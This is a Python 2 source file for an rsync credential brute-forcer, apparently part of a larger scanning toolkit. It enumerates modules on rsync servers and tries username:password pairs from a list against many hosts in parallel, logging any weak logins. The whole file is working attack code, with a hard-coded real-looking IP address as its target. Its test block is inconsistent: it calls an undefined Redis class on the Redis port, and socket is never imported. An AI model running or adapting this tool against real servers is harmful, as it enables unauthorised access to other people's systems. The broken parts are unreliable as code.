# -*- coding: utf-8 -*-
import threading
from printers import printPink,printRed,printGreen
from multiprocessing.dummy import Pool
from Queue import Queue
import re
import time
import threading
from threading import Thread
from rsynclib import *

class rsync_burp(object):

    def __init__(self,c):
        self.config=c
        self.lock=threading.Lock()
        self.result=[]
        self.lines=self.config.file2list("conf/rsync.conf")
        self.sp=Queue()

    def get_ver(self,host):
        debugging = 0
        r = rsync(host)
        r.set_debuglevel(debugging)
        return r.server_protocol_version


    def rsync_connect(self,ip,username,password,port):
        creak=0
        try:
            ver=self.get_ver(ip)# get rsync moudle
            fp = socket.create_connection((ip, port), timeout=8)
            fp.recv(99)

            fp.sendall(ver.strip('\r\n')+'\n')
            time.sleep(3)
            fp.sendall('\n')
            resp = fp.recv(99)

            modules = []
            for line in resp.split('\n'):
                modulename = line[:line.find(' ')]
                if modulename:
                    if modulename !='@RSYNCD:':
                        modules.append(modulename)

            if len(modules)!=0:
                for modulename in modules:
                    self.lock.acquire()
                    print "find %s module in %s at %s" %(modulename,ip,port)
                    self.lock.release()

                    rs = rsync(ip)
                    res = rs.login(module=modulename,user=username,passwd=password)
                    if re.findall('.*OK.*',res):
                        rs.close()
                        creak=1
                    if re.findall('.*Unknown.*',res):
                        creak=2
            else:
                creak=3

        except Exception,e:
            pass
        return creak


    def rsync_creak(self,ip,port):
            try:
                for data in self.lines:
                    username=data.split(':')[0]
                    password=data.split(':')[1]
                    flag=self.rsync_connect(ip,username,password,port)

                    if flag==3:
                        self.lock.acquire()
                        printRed("fail!!bacaues can't find any module\r\n")
                        self.lock.release()
                        break

                    if flag==2:
                        self.lock.acquire()
                        printRed("fail!!bacaues modulename is error\r\n")
                        self.lock.release()
                        break

                    if flag==1:
                        self.lock.acquire()
                        printGreen("%s rsync at %s has weaken password!!-------%s:%s\r\n" %(ip,port,username,password))
                        self.result.append("%s rsync at %s has weaken password!!-------%s:%s\r\n" %(ip,port,username,password))
                        self.lock.release()
                        break
                    else:
                        self.lock.acquire()
                        print "%s rsync service 's %s:%s login fail " %(ip,username,password)
                        self.lock.release()
            except Exception,e:
                print e


    def run(self,ipdict,pinglist,threads,file):
        if len(ipdict['rsync']):
            printPink("crack rsync  now...")
            print "[*] start crack rsync  %s" % time.ctime()
            starttime=time.time()

            pool=Pool(threads)

            for ip in ipdict['rsync']:
                pool.apply_async(func=self.rsync_creak,args=(str(ip).split(':')[0],int(str(ip).split(':')[1])))
            pool.close()
            pool.join()

            print "[*] stop rsync serice  %s" % time.ctime()
            print "[*] crack rsync done,it has Elapsed time:%s " % (time.time()-starttime)

            for i in xrange(len(self.result)):
                self.config.write_file(contents=self.result[i],file=file) 


if __name__ == '__main__':
    import sys
    sys.path.append("../")
    from comm.config import *
    c=config()
    ipdict={'rsync': ['101.201.177.35:6379']} 
    pinglist=['101.201.177.35']
    test=redis_burp(c)
    test.run(ipdict,pinglist,50,file="../result/test")

                